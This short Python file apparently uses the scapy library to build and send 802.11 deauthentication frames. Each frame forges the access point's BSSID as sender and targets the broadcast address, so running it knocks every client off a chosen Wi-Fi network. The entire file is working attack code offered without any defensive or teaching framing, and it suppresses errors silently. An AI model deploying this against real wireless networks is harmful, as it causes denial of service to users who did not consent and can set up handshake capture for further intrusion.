from scapy.all import *

class Deauthenticate(object):
 def __init__(self, iface, bssid):
  conf.verb = 0
  self.iface = iface

  client = 'ff:ff:ff:ff:ff:ff'
  self.pkt = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,
                              addr3=bssid)/Dot11Deauth(reason=7)

 def send_pkts(self, *args, **kwargs):
  try:sendp(self.pkt, iface=self.iface)
  except:pass
